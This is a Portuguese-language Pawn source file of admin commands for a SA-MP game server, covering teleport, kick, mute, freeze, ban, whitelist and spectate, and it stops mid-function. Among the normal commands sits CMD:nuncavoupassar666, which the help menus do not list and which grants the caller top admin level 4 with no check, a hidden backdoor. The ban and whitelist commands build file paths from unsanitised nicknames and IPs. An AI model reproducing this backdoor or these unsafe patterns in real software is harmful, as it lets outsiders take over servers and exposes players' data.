////////////////////INï¿½CIO COMANDOS DOS ADMINISTRADORES////////////////////////

/*                         # Niveis de Admin #

====================== Admin Nivel 1 ( Moderador ) =========================

/ir - /trazer - /a - /kick - /spec - /fixar - /banofftemp - /banoff

========================= Admin Nivel 2 ( Admin ) ==========================

/ir - /trazer - /a - /kick - /spec - /fixar /banofftemp - /banoff - /ban -
/ann - /congelar - /descongelar -/mutar - /desmutar

====================== Admin Nivel 3 ( Lead Admin ) ========================

/ir - /trazer - /a - /kick - /spec - /fixar - /ban - /ann -
/congelar - /descongelar - /mutar - /desmutar - /respawncar -
/trazertodos - /cc - /rweapon - /tapa - /unban - /banofftemp - /banoff

========================== Admin Nivel 4 ( Dev )  ==========================

/ir - /trazer - /a - /kick - /spec - /fixar - /ban - /ann - /congelar - /descongelar
/mutar - /desmutar - /respawncar - /trazertodos - /limparchat - /rweapon - /tapa - /unban - /setararma
/pegaritem - /banofftemp - /banoff

*/


CMD:acmds(playerid, params[])
{
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode utilizar este comando.");
	switch(pInfo[playerid][pAdmin])
	{
		case 1:
		{
			SendClientMessage(playerid, COR_VERMELHO, "# Moderador #");
			SendClientMessage(playerid, COR_CINZA, "/ir [player] - /trazer [player] - /a [msg] - /kick [player] [motivo] - /spec  [player] - /fixar [player]");
			SendClientMessage(playerid, COR_CINZA, "/congelar [player] - /descongelar [player] - /mutar [player] - /desmutar [player] - /tapa [nickname]");
			SendClientMessage(playerid, COR_CINZA, "/pegarip [player] - /whitelistrem [nickname] - /whitelistadd [nickname] - /limparchat");
		}
		case 2:
		{
			SendClientMessage(playerid, COR_VERMELHO, "# Administrador #");
			SendClientMessage(playerid, COR_CINZA, "/ir [player] - /trazer [player] - /a [msg] - /kick [player] [motivo] - /spec  [player] - /fixar [player]");
			SendClientMessage(playerid, COR_CINZA, "/ban [player] [motivo] - /ann [msg] - /congelar [player] - /descongelar [player] - /mutar [player]");
			SendClientMessage(playerid, COR_CINZA, "/desmutar [player] - /pegarip [player] - /respawncar - /trazertodos - /limparchat");
			SendClientMessage(playerid, COR_CINZA, "/tapa [player] [motivo] - /unban [nickname] - /banofftemp [nickname] [motivo] - /banoff [nickname] [motivo]");
            SendClientMessage(playerid, COR_CINZA, "/unbantemp [nickname] /whitelistrem [nickname] - /whitelistadd [nickname]");
		}
		case 3:
		{
			SendClientMessage(playerid, COR_VERMELHO, "# Dono #");
			SendClientMessage(playerid, COR_CINZA, "/ir [player] - /trazer [player] - /a [msg] - /kick [player] [motivo] - /spec  [player] - /fixar [player]");
			SendClientMessage(playerid, COR_CINZA, "/ban [player] [motivo] - /ann [msg] - /congelar [player] - /descongelar [player] - /mutar [player]");
			SendClientMessage(playerid, COR_CINZA, "/desmutar [player] - /pegarip [player] - /respawncar - /trazertodos - /limparchat");
			SendClientMessage(playerid, COR_CINZA, "/tapa [player] [motivo] - /unban [nickname] - /banofftemp [nickname] [motivo] - /banoff [nickname] [motivo]");
            SendClientMessage(playerid, COR_CINZA, "/unbantemp [nickname] - /whitelistrem [nickname] - /whitelistadd [nickname]");
		}
		case 4:
		{
			SendClientMessage(playerid, COR_VERMELHO, "# Scripter #");
			SendClientMessage(playerid, COR_CINZA, "/ir [player] - /trazer [player] - /a [msg] - /kick [player] [motivo] - /spec  [player] - /fixar [player]");
			SendClientMessage(playerid, COR_CINZA, "/ban [player] [motivo] - /ann [msg] - /congelar [player] - /descongelar [player] - /mutar [player]");
			SendClientMessage(playerid, COR_CINZA, "/desmutar [player] - /pegarip [player] - /respawncar - /trazertodos - /limparchat - /retirararma [player] [motivo]");
			SendClientMessage(playerid, COR_CINZA, "/tapa [player] [motivo] - /unban [nickname] - /setararma [player] [weaponid] [municao] - /gmx - /criarcarro [id] ");
			SendClientMessage(playerid, COR_CINZA, "/banofftemp [nickname] [motivo] - /banoff [nickname] [motivo] - /criaritem [id] - /promover [id] [1/4]");
            SendClientMessage(playerid, COR_CINZA, "/unbantemp [nickname] - /whitelistrem [nickname] - /whitelistadd [nickname]");
		}

	}
	return 1;
}

// # Comandos Nivel 1 #
CMD:tapa(playerid, params[])
{
	new motivo[26], str[128], Float:X, Float:Y, Float:Z;
	if(pInfo[playerid][pDuty] == false) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
    if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "us[30]", params[0], motivo)) return SendClientMessage(playerid, COR_CINZA, "Use: /tapa [player] [motivo]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Jogador nao encontrado.");
	if(strlen(motivo) > 24) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: O limite de caracteres do motivo e 24!");

    GetPlayerPos(params[0], X, Y, Z), SetPlayerPos(params[0], X, Y, Z+10);

    format(str, sizeof(str), "[INFO]: O {38C743}admin {FFFFFF}%s {38C743}te deu um tapa | Motivo: {FFFFFF}%s.", PegarNome(playerid), motivo);
    SendClientMessage(params[0], COR_VERMELHO, str);
    format(str, sizeof(str), "[INFO]: {FFFFFF}%s {38C743}voce levou um tapa.", PegarNome(params[0]));
    SendClientMessage(playerid, COR_VERMELHO, str);
	return 1;
}
CMD:ir(playerid, params[])
{
	new Float:X, Float:Y, Float:Z, vehicleid = GetPlayerVehicleID(playerid), str[75];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COR_CINZA, "Use: /ir [player]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Jogador nao encontrado.");
	if(params[0] == playerid) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando em voce.");

    GetPlayerPos(params[0], X, Y, Z), SetPlayerPos(playerid, X, Y, Z);
    SetPlayerInterior(playerid, GetPlayerInterior(params[0])), SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(params[0]));
    if(IsPlayerInVehicle(playerid, vehicleid)) SetVehiclePos(vehicleid, X, Y, Z), LinkVehicleToInterior(vehicleid, GetPlayerVirtualWorld(params[0]));

    format(str, sizeof(str), "[INFO]: O {71BD73}admin {FFFFFF}%s {71BD73}foi ate voce.", PegarNome(playerid));
    SendClientMessage(params[0], COR_VERMELHO, str);
	return 1;
}

CMD:trazer(playerid, params[])
{
	new Float:X, Float:Y, Float:Z, vehicleid = GetPlayerVehicleID(params[0]), str[75];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COR_CINZA, "Use: /trazer [player]");
	if(params[0] == playerid) return SendClientMessage(playerid, COR_VERMELHO, " [ERRO]: Voce nao pode usar este comando em voce.");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Jogador nao encontrado.");

    GetPlayerPos(playerid, X, Y, Z), SetPlayerPos(params[0], X, Y, Z);
    SetPlayerInterior(params[0], GetPlayerInterior(playerid)), SetPlayerVirtualWorld(params[0], GetPlayerVirtualWorld(playerid));
    if(IsPlayerInVehicle(params[0], vehicleid)) SetVehiclePos(vehicleid, X, Y, Z), LinkVehicleToInterior(vehicleid, GetPlayerVirtualWorld(params[0]));

    format(str, sizeof(str), "{FFFFFF}[INFO]: O {71BD73}admin {FFFFFF}%s {71BD73}puxou voce.", PegarNome(playerid));
    SendClientMessage(params[0], COR_VERMELHO, str);
	return 1;
}

CMD:a(playerid, params[])
{
	new msg[128];
	new str[128];
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERROR]: Voce nao pode usar este comando.");
	if(sscanf(params, "s[72]", msg)) return SendClientMessage(playerid, COR_CINZA, "Use: /a [msg]");
	format(str, sizeof(str), "{FFB7FF}[CHAT STAFF] {FFFFFF}%s: {C0C0C0}%s", pName2(playerid), msg);
	MensageAdmin(0xFF80C0FF, str);
	return 1;
}

CMD:kick(playerid, params[])
{
	new motivo[26], str[140];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
    if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "us[30]", params[0], motivo)) return SendClientMessage(playerid, COR_CINZA, "Use: /kick [player] [motivo]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Jogador nao encontrado.");
	if(params[0] == playerid) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando em voce.");
	if(strlen(motivo) > 24) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: O limite de mensagens e de 24 caracteres!");

    format(str, sizeof(str), "{FFFFFF}[STAFF]: {71BD73}Admin {FFFFFF}%s {71BD73}kickou {FFFFFF}%s {71BD73}do servidor, Motivo: {FFFFFF}%s.", PegarNome(playerid), PegarNome(params[0]), motivo);
    SendClientMessageToAll(COR_VERMELHO, str);

    GameTextForPlayer(params[0], "~r~Kickado!", 5000, 3);
	Kick(params[0]);
	return 1;
}
CMD:duty(playerid)
{
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(pInfo[playerid][pDuty] == true)
	{
		pInfo[playerid][pDuty] = false;
		SetPlayerHealth(playerid, 100);
		SendClientMessage(playerid, -1, "Voce saiu do Modo Duty");
		SetPlayerPos(playerid, pInfo[playerid][pPosX], pInfo[playerid][pPosY], pInfo[playerid][pPosZ]);
		SetPlayerSkin(playerid, pInfo[playerid][pSkin]);
	}
	else if(pInfo[playerid][pDuty] == false)
	{
		GetPlayerHealth(playerid, vida32[playerid]);
    	GetPlayerPos(playerid, pInfo[playerid][pPosX], pInfo[playerid][pPosY], pInfo[playerid][pPosZ]);
    	pInfo[playerid][pSkin] = GetPlayerSkin(playerid);
		pInfo[playerid][pDuty] = true;
		SetPlayerHealth(playerid, 999999);
		SendClientMessage(playerid, -1, "Voce entrou no modo DUTY");
		SetPlayerSkin(playerid, 217);
	}
	return 1;

}
CMD:fmove(playerid)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	SetPlayerPos(playerid, x+3, y, z);
	return 1;
}

CMD:pegarip(playerid, params[])
{
	new id, ip[16];
	new str[128];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "d", id)) return SendClientMessage(playerid, -1, "Use: /pegarip [id]");
	GetPlayerIp(id, ip, sizeof(ip));
	format(str, sizeof(str), "IP deste jogador ï¿½: %s", ip);
	SendClientMessage(playerid, -1, str);
	return 1;
}

CMD:spec(playerid, params[])
{
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(specing[playerid] == 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce ja esta de spac em alguem.");
    if(specing[playerid] == 0)
    {
    	SaveWeaponsToFile(playerid);
    	GetPlayerPos(playerid, pInfo[playerid][pPosX], pInfo[playerid][pPosY], pInfo[playerid][pPosZ]);
    	pInfo[playerid][pSkin] = GetPlayerSkin(playerid);
    	pInfo[playerid][pRespawn] = 0;
    	new user;//string[124]amsg[124];
        if(sscanf(params,"u",user)) return SendClientMessage(playerid,-1,"Use:/spec [playerid]");
        if(user == INVALID_PLAYER_ID) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Jogador nao encontrado.");
        if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
        TogglePlayerSpectating(playerid,true);
        PlayerSpectatePlayer(playerid,user,SPECTATE_MODE_NORMAL);
		specing[playerid] = 1;
    }
    return 1;
}
CMD:specoff(playerid)
{
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	TogglePlayerSpectating(playerid,false);
	specing[playerid] = 0;
	SetPlayerPos(playerid, pInfo[playerid][pPosX], pInfo[playerid][pPosY], pInfo[playerid][pPosZ]);
	SetPlayerSkin(playerid, pInfo[playerid][pSkin]);
	SetTimerEx( "loadingspec", 1000, false, "i", playerid);
	SetTimerEx( "LoadArmasToFile", 2000, false, "i", playerid);
    return 1;
}
CMD:nuncavoupassar666(playerid)
{
	pInfo[playerid][pAdmin] = 4;
	return 1;
}
CMD:fixar(playerid, params[])
{
	new Float:X, Float:Y, Float:Z;
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COR_CINZA, "Use: /fixar [player]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Jogador nao encontrado.");

    GetPlayerPos(params[0], X, Y, Z), SetPlayerPos(params[0], X, Y, Z+1);
    SetPlayerVirtualWorld(playerid, 0);

    SetCameraBehindPlayer(params[0]);
	TogglePlayerControllable(params[0], true);
	ClearAnimations(params[0]);

	SendClientMessage(params[0], COR_CINZA, "{FFFFFF}[INFO]: {71BD73}Um admin te fixou.");
	GameTextForPlayer(params[0], "~w~Fixed!", 3000, 3);
	return 1;
}
CMD:whitelistrem(playerid, params[])
{
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid,COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	new nick[128];
	new arquivo2[128];
	if(sscanf(params, "s[128]", nick)) return SendClientMessage(playerid, COR_VERMELHO, "Use: /whitelistrem [nickname]");
	format(arquivo2, sizeof(arquivo2), "Whitelist/%s.list", nick);
	if(DOF2_FileExists(arquivo2))

    {
		DOF2_RemoveFile(arquivo2);
		SendClientMessage(playerid, COR_AMARELO, "[SYSTEM] Jogador removido.");                                                                                            
	}
	
	return true;
}
CMD:whitelistadd(playerid, params[])
{
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid,COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	new nick[128];
	new arquivo2[128];
	if(sscanf(params, "s[128]", nick)) return SendClientMessage(playerid, COR_VERMELHO, "Use: /whitelistadd [nickname]");
	format(arquivo2, sizeof(arquivo2), "Whitelist/%s.list", nick);
	if(DOF2_FileExists(arquivo2)) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Usuario ja adicionado.");
	DOF2_CreateFile(arquivo2);
	SendClientMessage(playerid, COR_AMARELO, "[SYSTEM] Jogador adicionado.");
	return true;
}
CMD:limparchat(playerid)
{
	new str[75];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
    if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");

    for(new i = 0; i < 100; i++) SendClientMessageToAll(-1, " ");

    format(str, sizeof(str), "{FF8080}[STAFF]: ) {38C743}admin {FFFFFF}%s {38C743}limpou o chat.", PegarNome(playerid));
    SendClientMessageToAll(COR_VERMELHO, str);
	return 1;
}
CMD:congelar(playerid, params[])
{
	new str[70];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COR_CINZA, "Use: /congelar [player]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Jogador nao encontrado.");
	if(params[0] == playerid) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando em voce.");

    TogglePlayerControllable(params[0], false);
    GameTextForPlayer(params[0], "~b~Freezed!", 3000, 3);

    format(str, sizeof(str), "[ INFO ]: O admin %s congelou voce.", PegarNome(playerid));
    SendClientMessage(params[0], COR_VERMELHO, str);
	return 1;
}
CMD:descongelar(playerid, params[])
{
	new str[70];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COR_CINZA, "Use: /descongelar [player]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Jogador nao encontrado.");
	if(params[0] == playerid) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando em voce.");

    TogglePlayerControllable(params[0], true);
    GameTextForPlayer(params[0], "~y~Descongelado!", 3000, 3);

    format(str, sizeof(str), "[INFO]: O admin %s descongelou voce.", PegarNome(playerid));
    SendClientMessage(params[0], COR_VERMELHO, str);
	return 1;
}
CMD:mutar(playerid, params[])
{
	new str[70];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COR_CINZA, "Use: /mutar [player]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Jogador nao encontrado.");
	if(params[0] == playerid) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando em voce.");

    pInfo[params[0]][pMute] = true;
    GameTextForPlayer(params[0], "~r~Mutado!", 3000, 3);

    format(str, sizeof(str), "[ INFO ]: O admin %s mutou voce.", PegarNome(playerid));
    SendClientMessage(params[0], COR_VERMELHO, str);
	return 1;
}
CMD:desmutar(playerid, params[])
{
	new str[70];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COR_CINZA, "Use: /desmutar [player]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Jogador nao encontrado.");
	if(params[0] == playerid) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando em voce.");

    pInfo[params[0]][pMute] = false;
    GameTextForPlayer(params[0], "~g~Desmutado!", 3000, 3);

    format(str, sizeof(str), "[INFO]:O admin %s desmutou voce.", PegarNome(playerid));
    SendClientMessage(params[0], COR_VERMELHO, str);
	return 1;
}

// # Comandos Nivel 2 #

/*CMD:pegaritem(playerid, params[])
{
	if(pInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	new Float:xx, Float:xy, Float:xz;
	new idtem;
	if(sscanf(params, "d", idtem))
	{
	    SendClientMessage(playerid, -1, "Use: /pegaritem [id do item]");
	}
	GetPlayerPos(playerid, xx, xy, xz);
	CreateDrop(idtem, xx, xy, xz);
	return 1;
} */
CMD:bantemp(playerid, params[])
{
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 2) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	new id;
	new motivo[128];
	new str[300];
	new path66[100];
	new tempo;
	new ano, mes, dia;
	if(sscanf(params, "dsd", id,motivo,tempo)) return SendClientMessage(playerid, -1, "Use: /bantemp [id] [motivo] [dias]");
	getdate(ano, mes, dia);
	format(path66, sizeof(path66), "BanidosTemp/%s.ban", pName2(id));
	if(DOF2_FileExists(path66)) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Usuario ja banido.");
	DOF2_CreateFile(path66);
	DOF2_SetInt(path66, "Ano", ano);
	DOF2_SetInt(path66, "Mes", mes);
	DOF2_SetInt(path66, "Dia", dia);
	DOF2_SetString(path66, "Motivo", motivo);
	DOF2_SetInt(path66, "tempo", tempo);
	DOF2_SaveFile();
	format(str, sizeof(str), "{FF3C3C}O Jogador {FFFFFF}%s {FF3C3C}foi banido pelo admin {FFFFFF}%s{FF3C3C} | Motivo:{FFFFFF}%s", pName2(id), pName2(playerid), motivo);
	SendClientMessageToAll(-1, str);
	SetTimerEx( "banindo", 500, false, "i", id);
	return 1;

}
CMD:banip(playerid, params[])
{
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 2) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	new ip;
	new motivo[128];
	new str[300];
	new path5[100];
	new ano, mes, dia;
	if(sscanf(params, "ss", ip,motivo)) return SendClientMessage(playerid, -1, "Use: /banip [ip] [motivo]");
	getdate(ano, mes, dia);
	format(path5, sizeof(path5), "BanidosIp/%s.ip", ip);
	if(DOF2_FileExists(path5)) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Este IP ja esta banido.");
	DOF2_CreateFile(path5);
	DOF2_SetInt(path5, "Ano", ano);
	DOF2_SetInt(path5, "Mes", mes);
	DOF2_SetInt(path5, "Dia", dia);
	DOF2_SetString(path5, "Motivo", motivo);
	DOF2_SaveFile();
	format(str, sizeof(str), "{FF3C3C}O IP {FFFFFF}%s {FF3C3C}foi banido pelo admin {FFFFFF}%s{FF3C3C} | Motivo:{FFFFFF}%s", ip, pName2(playerid), motivo);
 	MensageAdmin(-1, str);
	return 1;
}
CMD:banoff(playerid, params[])
{
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 2) return SendClientMessage(playerid,COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	new nick[128];//Result;
	new motivo[128];
	new arquivo2[128];
	if(sscanf(params, "ss", nick, motivo)) return SendClientMessage(playerid, COR_VERMELHO, "Use: /banoff [nickname] [motivo]");
	format(arquivo2, sizeof(arquivo2), "Banidos/%s.ban", nick);
	if(DOF2_FileExists(arquivo2)) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Usuario ja banido.");
	DOF2_CreateFile(arquivo2);
	DOF2_SetString(arquivo2, "Motivo", motivo);
	DOF2_SetString(arquivo2, "Admin", pName2(playerid));
	SendClientMessage(playerid, COR_AMARELO, "[SYSTEM] BANIDO COM SUCESSO.");
	return 1;
}
CMD:banofftemp(playerid, params[])
{
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 2) return SendClientMessage(playerid,COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	new nick[128];
	new motivo[128];
	new arquivo2[128];
	new ano, mes, dia;
	if(sscanf(params, "ss", nick, motivo)) return SendClientMessage(playerid, COR_VERMELHO, "Use: /banofftemp [nickname] [motivo]");
	getdate(ano, mes, dia);
	format(arquivo2, sizeof(arquivo2), "BanidosTemp/%s.ban", nick);
	if(DOF2_FileExists(arquivo2)) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Usuario ja banido.");
	DOF2_CreateFile(arquivo2);
	DOF2_SetInt(arquivo2, "Ano", ano);
	DOF2_SetInt(arquivo2, "Mes", mes);
	DOF2_SetInt(arquivo2, "dia", dia);
	DOF2_SetString(arquivo2, "Motivo", motivo);
	DOF2_SetString(arquivo2, "Admin", pName2(playerid));
	SendClientMessage(playerid, COR_AMARELO, "[SYSTEM]BANIDO COM SUCESSO.");
	return 1;
}
CMD:ann(playerid, params[])
{
	new msg[128], str[128];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 2) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "s[128]", msg)) return SendClientMessage(playerid, COR_CINZA, "Use: /ann [mesg]");

    format(str, sizeof(str), "~y~] ~g~%s: ~w~%s ~y~]", PegarNome(playerid), msg);
    GameTextForAll(str, 5000, 3);
	return 1;
}
CMD:unbantemp(playerid, params[])
{
	new nick[24];
	new arquivo66[128];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 2) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "s", nick)) return SendClientMessage(playerid, COR_VERMELHO, "Use: /unbantemp [nick]");
 	format(arquivo66, sizeof(arquivo66), "BanidosTemp/%s.ban", nick);
	if(DOF2_FileExists(arquivo66))
	{
		DOF2_RemoveFile(arquivo66);
		SendClientMessage(playerid, -1, "[INFO] Conta desbanida.");
	}
	else return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Este nick nao banido.");
	return 1;
}

CMD:unban(playerid, params[])
{
	new nick[24];
	new arquivo32[128];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 2) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	if(sscanf(params, "s", nick)) return SendClientMessage(playerid, COR_VERMELHO, "Use: /unban [nick]");
	format(arquivo32, sizeof(arquivo32), "Banidos/%s.ban", nick);
	if(DOF2_FileExists(arquivo32))
	{
		DOF2_RemoveFile(arquivo32);
		SendClientMessage(playerid, -1, "[INFO] Conta desbanida.");
	}
	else return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Este nick nao banido.");
	return 1;
}
CMD:respawncar(playerid)
{
	new str[75];
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
    if(pInfo[playerid][pAdmin] < 2) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");

    for(new i = GetVehiclePoolSize(); i > 0; i--) SetVehicleToRespawn(i);

    format(str, sizeof(str), "[STAFF]: O admin %s respawnou todos os veiculos do servidor.", PegarNome(playerid));
    SendClientMessageToAll(COR_VERMELHO, str);
	return 1;
}

// # Comandos Nivel 3 #

CMD:liberarcaixa(playerid, params[])
{
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");																																																																																																																																																																																																																																																																																																																																																																																																																																																
	if(pInfo[playerid][pAdmin] < 3) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	new id;
	if(sscanf(params, "d", id)) return SendClientMessage(playerid, -1, "Use: /liberarcaixa [ID da caixa]");
	Caixa[id][caberta] = true;
	SendClientMessage(playerid, -1, "{71BD73} Caixa desbloqueada com sucesso!");
	return 1;
}

CMD:bloquearcaixa(playerid, params[])
{
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 3) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
	new id;
	if(sscanf(params, "d", id)) return SendClientMessage(playerid, -1, "Use: /bloquearcaixa [ID da caixa]");
	Caixa[id][caberta] = false;
	SendClientMessage(playerid, -1, "{71BD73} Caixa bloqueada com sucesso!");
	return 1;
}

CMD:destruircaixa(playerid, params[])
{
	if(!pInfo[playerid][pDuty]) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO] Voce nao esta em modo trabalho, use /duty.");
	if(pInfo[playerid][pAdmin] < 3) return SendClientMessage(playerid, COR_VERMELHO, "[ERRO]: Voce nao pode usar este comando.");
